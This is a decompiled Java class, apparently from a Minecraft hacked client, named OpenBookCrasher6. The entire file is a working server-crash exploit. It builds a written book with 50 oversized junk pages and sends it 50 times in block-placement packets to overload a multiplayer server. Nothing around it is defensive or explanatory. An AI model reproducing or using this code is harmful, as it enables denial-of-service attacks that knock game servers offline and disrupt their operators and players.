// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher.obc;

import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketPlayerBlockPlacement;
import net.minecraft.util.math.BlockPos;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.client.Minecraft;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.item.ItemStack;
import net.minecraft.init.Items;

public class OpenBookCrasher6
{
    public void start() {
        final ItemStack itemStack = new ItemStack(Items.WRITTEN_BOOK);
        final NBTTagList list = new NBTTagList();
        final NBTTagCompound tag = new NBTTagCompound();
        Minecraft.getMinecraft();
        final String author = Minecraft.getSession().getUsername();
        final String title = "Play with me.";
        final String size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
        for (int i = 0; i < 50; ++i) {
            final NBTTagString tString = new NBTTagString(size);
            list.appendTag(tString);
        }
        tag.setString("author", author);
        tag.setString("title", title);
        tag.setTag("pages", list);
        itemStack.setTagInfo("pages", list);
        itemStack.setTagCompound(tag);
        for (int i = 0; i != 50; ++i) {
            Minecraft.getMinecraft().player.connection.sendPacket(new CPacketPlayerBlockPlacement(new BlockPos(Minecraft.getMinecraft().player.posX, Minecraft.getMinecraft().player.posY - 2.0, Minecraft.getMinecraft().player.posZ), 1, itemStack, 0.0f, 0.0f, 0.0f));
        }
    }
}
